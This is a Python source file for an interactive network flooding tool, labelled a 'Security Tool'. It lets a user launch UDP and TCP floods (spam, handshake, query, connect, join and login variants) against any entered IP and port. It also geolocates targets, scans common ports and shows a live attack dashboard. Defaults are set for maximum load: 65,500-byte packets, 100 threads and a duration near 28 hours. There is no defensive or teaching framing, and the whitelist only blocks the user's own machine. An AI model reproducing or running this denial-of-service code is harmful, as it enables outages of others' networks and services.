#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import random
import time
import threading
import json
import csv
from datetime import datetime
from colorama import init, Fore, Style
import requests

# ASCII Art Color 

#Red: \033[91m
#Green: \033[92m
#Yellow: \033[93m
#Blue: \033[94m
#Magenta: \033[95m
#Cyan: \033[96m
#White: \033[97m
#Black: \033[90m

# Initialize Colorama
init(autoreset=True)

# ============================================
# CONFIGURATION & SETTINGS
# ============================================
VERSION = "2.0"
DEVELOPER = "Security Tool"
WHITELIST = ['127.0.0.1']
BLACKLIST = []
CONFIG_FILE = "Config.json"
RESULTS_FILE = "Results.txt"

# ============================================
# ASCII ART & UI
# ============================================
ASCII_ART = """
""".format(VERSION=VERSION)

# ============================================
# ATTACK STATISTICS CLASS
# ============================================
class AttackStats:
    def __init__(self):
        self.total_packets = 0
        self.total_bytes = 0
        self.start_time = None
        self.packets_per_second = 0
        self.active_threads = 0
        self.target_status = "Unknown"
        
    def start(self):
        self.start_time = time.time()
        self.total_packets = 0
        self.total_bytes = 0
        
    def update(self, packets, bytes_sent):
        self.total_packets += packets
        self.total_bytes += bytes_sent
        if self.start_time:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                self.packets_per_second = self.total_packets / elapsed
    
    def get_stats(self):
        if not self.start_time:
            return {}
        
        elapsed = time.time() - self.start_time
        return {
            'total_packets': self.total_packets,
            'total_bytes': self.total_bytes,
            'packets_per_second': self.packets_per_second,
            'elapsed_time': elapsed,
            'target_status': self.target_status
        }

# Global stats instance
stats = AttackStats()

# ============================================
# VALIDATION & SECURITY FUNCTIONS
# ============================================
def validate_input(prompt, min_val, max_val, input_type=int, default=None):
    while True:
        try:
            value = input(Fore.LIGHTBLUE_EX + prompt)
            if value == "" and default is not None:
                return default
            value = input_type(value)
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[❌] Invalid input! Numbers only.")

def is_target_allowed(ip):
    if ip in WHITELIST:
        print(Fore.YELLOW + f"[⚠️] Warning: {ip} is in whitelist! Attack blocked.")
        return False
    if ip in BLACKLIST:
        print(Fore.RED + f"[❌] Error: {ip} is in blacklist!")
        return False
    return True

def validate_target(ip, port):
    try:
        print(Fore.CYAN + f"[🔍] Checking target {ip}:{port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, port))
        sock.close()
        
        if result == 0:
            stats.target_status = "Online"
            print(Fore.GREEN + f"[✅] Target {ip}:{port} is online!")
            return True
        else:
            stats.target_status = "Offline/Blocked"
            print(Fore.YELLOW + f"[⚠️] Target {ip}:{port} may be offline or blocking connections")
            return True  # Still allow attack if user wants
    except Exception as e:
        print(Fore.RED + f"[❌] Connection test failed: {e}")
        return False

def get_ip_location(ip):
    try:
        print(Fore.CYAN + f"[🌍] Getting location for {ip}...")
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown')
                }
    except:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'org': 'Unknown'}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# ============================================
# ATTACK METHODS - ENHANCED WITH MULTI-THREADING
# ============================================
def threaded_attack(target_func, ip, port, duration, packet_size, thread_count=5):
    threads = []
    stats.active_threads = thread_count
    
    def attack_worker(worker_id):
        try:
            target_func(ip, port, duration, packet_size, worker_id)
        except Exception as e:
            print(Fore.RED + f"[❌] Thread {worker_id} error: {e}")
    
    print(Fore.CYAN + f"[⚡] Starting {thread_count} attack threads...")
    for i in range(thread_count):
        t = threading.Thread(target=attack_worker, args=(i+1,))
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for all threads or duration
    start_time = time.time()
    while time.time() - start_time < duration and any(t.is_alive() for t in threads):
        time.sleep(0.1)
    
    stats.active_threads = 0
    print(Fore.GREEN + f"[✅] All attack threads completed!")

# UDP Attack Methods
def udp_spam(ip, port, duration, packet_size, thread_id=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.5)
    end_time = time.time() + duration
    local_packet_count = 0
    
    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Spam on {ip}:{port} | Size: {packet_size} bytes")
    
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            try:
                sock.sendto(payload, (ip, port))
                local_packet_count += 0
                stats.update(1, packet_size)
            except:
                break
            
            # Rate limiting for stability
            if local_packet_count % 100 == 0:
                time.sleep(0.01)
    except Exception as e:
        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Thread-{thread_id}: Sent {local_packet_count} packets")

def udp_handshake(ip, port, duration, packet_size, thread_id=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    local_packet_count = 0
    
    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Handshake on {ip}:{port}")
    
    try:
        while time.time() < end_time:
            handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)
            try:
                sock.sendto(handshake, (ip, port))
                local_packet_count += 0
                stats.update(1, packet_size)
            except:
                break
    except Exception as e:
        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
    finally:
        sock.close()

def udp_query(ip, port, duration, packet_size, thread_id=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    local_packet_count = 0
    
    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Query on {ip}:{port}")
    
    try:
        while time.time() < end_time:
            query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)
            try:
                sock.sendto(query, (ip, port))
                local_packet_count += 0
                stats.update(1, packet_size)
            except:
                break
    except Exception as e:
        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
    finally:
        sock.close()

# TCP Attack Methods
def tcp_connect(ip, port, duration, packet_size, thread_id=1):
    end_time = time.time() + duration
    local_connection_count = 0
    
    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Connect on {ip}:{port}")
    
    try:
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    local_connection_count += 0
                    stats.update(1, 40)  # Approx TCP header size
                sock.close()
            except:
                pass
            
            # Prevent overwhelming system
            if local_connection_count % 50 == 0:
                time.sleep(0.01)
    except Exception as e:
        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")

def tcp_join(ip, port, duration, packet_size, thread_id=1):
    end_time = time.time() + duration
    local_packet_count = 0
    
    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Join on {ip}:{port}")
    
    try:
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)
                sock.send(handshake)
                local_packet_count += 0
                stats.update(1, packet_size)
                sock.close()
            except:
                pass
    except Exception as e:
        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")

def tcp_login(ip, port, duration, packet_size, thread_id=1):
    end_time = time.time() + duration
    local_packet_count = 0
    
    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Login on {ip}:{port}")
    
    try:
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)
                sock.send(login)
                local_packet_count += 0
                stats.update(1, packet_size)
                sock.close()
            except:
                pass
    except Exception as e:
        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")

# ============================================
# MONITORING & DASHBOARD
# ============================================
def live_dashboard():
    os.system('clear')
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "LIVE ATTACK DASHBOARD")
    print(Fore.CYAN + "="*60)
    
    stats_data = stats.get_stats()
    if stats_data:
        print(f"{Fore.GREEN}Target Status: {stats.target_status}")
        print(f"{Fore.CYAN}Packets Sent: {stats_data['total_packets']:,}")
        print(f"{Fore.CYAN}Bytes Sent: {stats_data['total_bytes']:,} ({stats_data['total_bytes']/1024/1024:.2f} MB)")
        print(f"{Fore.CYAN}Packets/Second: {stats_data['packets_per_second']:.2f}")
        print(f"{Fore.CYAN}Elapsed Time: {stats_data['elapsed_time']:.2f}s")
        print(f"{Fore.CYAN}Active Threads: {stats.active_threads}")
    else:
        print(f"{Fore.YELLOW}No attack running...")
    
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "Press Ctrl+C to stop attack")
    print(Fore.CYAN + "="*60)

def start_monitor(interval=2):
    def monitor():
        while stats.active_threads > 0:
            live_dashboard()
            time.sleep(interval)
    
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    return monitor_thread

# ============================================
# CONFIGURATION MANAGEMENT
# ============================================
def save_config(config_data):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config_data, f, indent=4)
        print(Fore.GREEN + f"[✅] Configuration saved to {CONFIG_FILE}")
        return True
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to save config: {e}")
        return False

def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
            print(Fore.GREEN + f"[✅] Configuration loaded from {CONFIG_FILE}")
            return config
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to load config: {e}")
    return None

def save_results(attack_data):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        attack_data['timestamp'] = timestamp
        
        # Save to JSON
        with open("attack_results.json", 'a') as f:
            json.dump(attack_data, f)
            f.write("\n")
        
        # Save to text file
        with open(RESULTS_FILE, 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Attack Results - {timestamp}\n")
            f.write(f"{'='*60}\n")
            for key, value in attack_data.items():
                f.write(f"{key}: {value}\n")
        
        print(Fore.GREEN + f"[✅] Results saved to {RESULTS_FILE}")
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to save results: {e}")

# ============================================
# MAIN MENU & INTERFACE
# ============================================
def print_banner():
    os.system('clear')
    print(ASCII_ART)
    
def show_main_menu():
    print(Fore.LIGHTBLUE_EX + "\033[92m        🔹 MAIN MENU 🔹        \033[97m")
    print("\033[94m" + "="*32 + "\033[97m")
    print("")
    print("  \033[90m[1]\033[97m \033[91mNetwork Attack Methods\033[97m")
    print("")
    print("  \033[90m[2]\033[97m \033[91mTarget Information\033[97m")
    print("")
    print("  \033[90m[3]\033[97m \033[91mLoad/Save Configuration\033[97m")
    print("")
    print("  \033[90m[4]\033[97m \033[91mView Previous Results\033[97m")
    print("")
    print("  \033[90m[5]\033[97m \033[91mSettings & Whitelist\033[97m")
    print("")
    print("  \033[90m[0]\033[97m \033[91mExit\033[97m")
    print("")
    
    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect option (0-5): \033[92m").strip()
    return choice

def show_attack_menu():
    print_banner()
    print(Fore.LIGHTBLUE_EX + "\033[92m    🔹 ATTACK METHODS 🔹    \033[97m")
    print("\033[94m" + "="*32 + "\033[97m")
    print()
    print(Fore.YELLOW + "[UDP ATTACKS]")
    print("  \033[90m[1]\033[97m \033[91mUDP Spam Flood\033[97m")
    print("  \033[90m[2]\033[97m \033[91mUDP Handshake Flood\033[97m")
    print("  \033[90m[3]\033[97m \033[91mUDP Query Flood\033[97m")
    print()
    print(Fore.YELLOW + "[TCP ATTACKS]")
    print("  \033[90m[4]\033[97m \033[91mTCP Connect Flood\033[97m")
    print("  \033[90m[5]\033[97m \033[91mTCP Join Flood\033[97m")
    print("  \033[90m[6]\033[97m \033[91mTCP Login Flood\033[97m")
    print("  \033[90m[0]\033[97m \033[91mBack to Main Menu\033[97m")
    print()
    
    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect method (0-6): \033[92m").strip()
    return choice

def get_attack_parameters():
    print()
    print(Fore.LIGHTBLUE_EX + "\033[92m   🔹 ATTACK PARAMETERS 🔹   \033[97m")
    print("\033[94m" + "="*30)
    
    # Target IP
    while True:
        ip = input(Fore.LIGHTBLUE_EX + "\033[97mTarget IP: \033[92m").strip()
        if ip:
            if not is_target_allowed(ip):
                continue
            break
    
    # Port
    port = validate_input("\033[97mTarget Port (1-65535, default 80): \033[92m", 1, 65535, default=80)
    
    # Duration
    duration = validate_input("\033[97mDuration in seconds: \033[92m", 1, 99999, float, default=99999)
    
    # Packet size
    packet_size = validate_input("\033[97mPacket size in bytes (65500): \033[92m", 1, 65500, default=65500)
    
    # Thread count
    thread_count = validate_input("\033[97mThread count (default 100): \033[92m", 1, 100, default=100)
    
    return {
        'ip': ip,
        'port': port,
        'duration': duration,
        'packet_size': packet_size,
        'thread_count': thread_count
    }

def run_attack(method_choice, params):
    attack_methods = {
        '1': (udp_spam, "UDP Spam Flood"),
        '2': (udp_handshake, "UDP Handshake Flood"),
        '3': (udp_query, "UDP Query Flood"),
        '4': (tcp_connect, "TCP Connect Flood"),
        '5': (tcp_join, "TCP Join Flood"),
        '6': (tcp_login, "TCP Login Flood")
    }
    
    if method_choice in attack_methods:
        method_func, method_name = attack_methods[method_choice]
        
        print()
        print(Fore.YELLOW + "="*60)
        print(Fore.RED + f"STARTING {method_name}")
        print(Fore.YELLOW + "="*60)
        print(Fore.CYAN + f"Target: {params['ip']}:{params['port']}")
        print(Fore.CYAN + f"Duration: {params['duration']} seconds")
        print(Fore.CYAN + f"Threads: {params['thread_count']}")
        print(Fore.YELLOW + "="*60)
        
        # Validate target first
        if not validate_target(params['ip'], params['port']):
            confirm = input(Fore.YELLOW + "[⚠️] Target may be offline. Continue? (y/n): ").lower()
            if confirm != 'y':
                return None
        
        # Start monitoring
        stats.start()
        monitor_thread = start_monitor()
        
        # Start attack with threading
        try:
            threaded_attack(
                method_func,
                params['ip'],
                params['port'],
                params['duration'],
                params['packet_size'],
                params['thread_count']
            )
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[⚠️] Attack interrupted by user!")
        except Exception as e:
            print(Fore.RED + f"[❌] Attack failed: {e}")
        
        # Final statistics
        final_stats = stats.get_stats()
        if final_stats:
            print()
            print(Fore.GREEN + "="*60)
            print(Fore.GREEN + "ATTACK COMPLETED SUCCESSFULLY!")
            print(Fore.GREEN + "="*60)
            print(Fore.CYAN + f"Total Packets: {final_stats['total_packets']:,}")
            print(Fore.CYAN + f"Total Data: {final_stats['total_bytes']/1024/1024:.2f} MB")
            print(Fore.CYAN + f"Average Speed: {final_stats['packets_per_second']:.2f} packets/sec")
            print(Fore.CYAN + f"Duration: {final_stats['elapsed_time']:.2f} seconds")
            print(Fore.GREEN + "="*60)
        
        return final_stats
    else:
        print(Fore.RED + "[❌] Invalid attack method!")
        return None

# ============================================
# ADDITIONAL FEATURES
# ============================================
def show_target_info():
    print_banner()
    print(Fore.LIGHTBLUE_EX + "\033[92m   🔹 TARGET INFORMATION 🔹   \033[97m")
    print("\033[94m" + "="*31)
    
    ip = input(Fore.LIGHTBLUE_EX + "\033[97mEnter IP address: \033[92m").strip()
    if not ip:
        return
    
    print()
    print(Fore.CYAN + "[🔍] Gathering information...")
    
    # Get location
    location = get_ip_location(ip)
    if location:
        print(Fore.GREEN + f"Country: {location['country']}")
        print(Fore.GREEN + f"City: {location['city']}")
        print(Fore.GREEN + f"ISP: {location['isp']}")
        print(Fore.GREEN + f"Organization: {location['org']}")
    
    # Check common ports
    print()
    print(Fore.CYAN + "[🔍] Scanning common ports...")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 8080, 8443]
    
    open_ports = []
    for port in common_ports[:10]:  # Limit to first 10 for speed
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    
    if open_ports:
        print(Fore.GREEN + f"Open ports: {', '.join(map(str, open_ports))}")
    else:
        print(Fore.YELLOW + "No common ports open (or filtered)")
    
    input(Fore.CYAN + "\nPress Enter to continue...")

def show_settings():
    # Tambahkan deklarasi global di sini
    global WHITELIST, BLACKLIST
    
    print_banner()
    print(Fore.LIGHTBLUE_EX + "   🔹 SETTINGS & CONFIGURATION 🔹   ")
    print("\033[94m" + "="*37)
    
    print()
    print(Fore.YELLOW + "[1] View Whitelist")
    print("")
    print(Fore.YELLOW + "[2] Add to Whitelist")
    print("")
    print(Fore.YELLOW + "[3] Remove from Whitelist")
    print("")
    print(Fore.YELLOW + "[4] View Blacklist")
    print("")
    print(Fore.YELLOW + "[5] Back to Main")
    print("")
    
    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect option: \033[92m").strip()
    
    if choice == '1':
        print(Fore.GREEN + f"\nWhitelist: {WHITELIST}")
    elif choice == '2':
        ip = input(Fore.CYAN + "IP to whitelist: ").strip()
        if ip and ip not in WHITELIST:
            WHITELIST.append(ip)
            print(Fore.GREEN + f"[✅] Added {ip} to whitelist")
    elif choice == '3':
        ip = input(Fore.CYAN + "IP to remove: ").strip()
        if ip in WHITELIST:
            WHITELIST.remove(ip)
            print(Fore.GREEN + f"[✅] Removed {ip} from whitelist")
    
    input(Fore.CYAN + "\nPress Enter to continue...")

# ============================================
# MAIN APPLICATION
# ============================================
def main():
    # Deklarasikan global di awal fungsi
    global WHITELIST, BLACKLIST
    
    print_banner()

    # Main loop
    while True:
        print_banner()
        choice = show_main_menu()
        
        if choice == '0':
            print(Fore.YELLOW + "Goodbye!")
            break
            
        elif choice == '1':
            # Attack methods
            while True:
                method_choice = show_attack_menu()
                if method_choice == '0':
                    break
                
                params = get_attack_parameters()
                if params:
                    results = run_attack(method_choice, params)
                    if results:
                        # Save results
                        save_choice = input(Fore.CYAN + "\nSave results? (y/n): ").lower()
                        if save_choice == 'y':
                            results.update(params)
                            save_results(results)
                
                input(Fore.CYAN + "\nPress Enter to continue...")
        
        elif choice == '2':
            show_target_info()
            
        elif choice == '3':
            print_banner()
            print(Fore.LIGHTBLUE_EX + "🔹  CONFIGURATION MANAGER  🔹")
            print()
            print(Fore.YELLOW + "[1] Save Current Settings")
            print("")
            print(Fore.YELLOW + "[2] Load Saved Settings")
            print("")
            print(Fore.YELLOW + "[3] Back")
            print("")
            
            config_choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect: \033[92m").strip()
            
            if config_choice == '1':
                config = {
                    'whitelist': WHITELIST,
                    'blacklist': BLACKLIST,
                    'version': VERSION
                }
                save_config(config)
            elif config_choice == '2':
                loaded = load_config()
                if loaded:
                    # Tidak perlu deklarasi global lagi di sini
                    WHITELIST = loaded.get('whitelist', WHITELIST)
                    BLACKLIST = loaded.get('blacklist', BLACKLIST)
            
            input(Fore.CYAN + "\nPress Enter to continue...")
            
        elif choice == '4':
            if os.path.exists(RESULTS_FILE):
                print_banner()
                print(Fore.LIGHTBLUE_EX + "🔹  PREVIOUS RESULTS  🔹")
                print("\033[94m" + "="*40)
                
                try:
                    with open(RESULTS_FILE, 'r') as f:
                        content = f.read()
                        print(content[-2000:])  # Show last 2000 chars
                except:
                    print(Fore.RED + "Could not read results file")
            else:
                print(Fore.YELLOW + "No results file found")
            
            input(Fore.CYAN + "\nPress Enter to continue...")
            
        elif choice == '5':
            show_settings()

# ============================================
# ENTRY POINT
# ============================================
if __name__ == "__main__":
    try:
        # Check if running as root (for some features)
        if os.name == 'posix':
            if os.geteuid() != 0:
                print(Fore.YELLOW + "[⚠️] Some features may require root privileges")
        
        # Create results directory if it doesn't exist
        if not os.path.exists("results"):
            os.makedirs("results")
        
        # Start main application
        main()
        
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[⚠️] Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[❌] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)